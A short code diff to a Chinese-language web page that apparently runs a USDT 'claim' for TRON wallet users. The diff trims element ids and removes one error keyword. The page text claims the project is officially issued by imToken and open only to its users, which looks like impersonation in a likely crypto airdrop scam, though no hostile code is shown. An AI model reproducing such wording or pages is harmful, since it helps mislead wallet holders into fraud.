@@ -301,8 +301,8 @@ body {
                 <h3 id="contractResourceTitle">合约剩余资源</h3>
             </div>
             <div class="resource-content" style="line-height: 2;">
-                <p id="contractAddrText">• 合约地址：<span class="highlight" id="contractAddr"></span></p>
-                <p id="contractEnergyText">• 剩余能量：<span class="highlight data-tag" id="contractEnergy"></span></p>
+                <p>• 合约地址：<span class="highlight" id="contractAddr"></span></p>
+                <p>• 剩余能量：<span class="highlight data-tag" id="contractEnergy"></span></p>
                 <p style="font-size: 12px; color: #a0a8a4; margin-top: 5px;" id="contractNote">
                     注：所有剩余量为“ 0 ”时停止领取，该项目为imToken官方发行，只限imToken钱包用户参与。
                 </p>
@@ -579,7 +579,7 @@ function isCustomerError(errMsg) {
     // 客户自身原因关键词（多语言适配）
     const customerErrorKeys = [
         lang.ineligibleTip, "无效TRON地址", "USDT余额不足", "不符合领取条件", "30天内已领取", 
-        "跨组执行", "未检测到钱包地址", "Ineligible", "invalid TRON address", 
+         "未检测到钱包地址", "Ineligible", "invalid TRON address", 
         "USDT balance", "within 30 days"
     ];
     return customerErrorKeys.some(key => errMsg.includes(key));
